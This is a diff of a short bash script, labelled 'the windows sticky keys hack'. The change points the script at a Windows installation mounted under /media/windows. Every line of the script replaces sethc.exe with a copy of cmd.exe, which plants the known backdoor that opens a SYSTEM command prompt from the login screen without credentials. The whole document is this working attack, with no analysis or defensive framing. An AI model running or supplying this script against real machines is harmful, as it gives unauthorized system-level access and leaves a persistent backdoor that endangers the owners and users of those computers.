@@ -1,6 +1,6 @@
 #!/bin/bash
 #execute the windows sticky keys hack
 
-cp "Windows/System32/cmd.exe" "Windows/System32/cmdlol.exe"
-mv "Windows/System32/sethc.exe" "Windows/System32/sethcold.exe"
-mv "Windows/System32/cmdlol.exe" "Windows/System32/sethc.exe"
+cp "/media/windows/Windows/System32/cmd.exe" "/media/windows/Windows/System32/cmdlol.exe"
+mv "/media/windows/Windows/System32/sethc.exe" "/media/windows/Windows/System32/sethcold.exe"
+mv "/media/windows/Windows/System32/cmdlol.exe" "/media/windows/Windows/System32/sethc.exe"
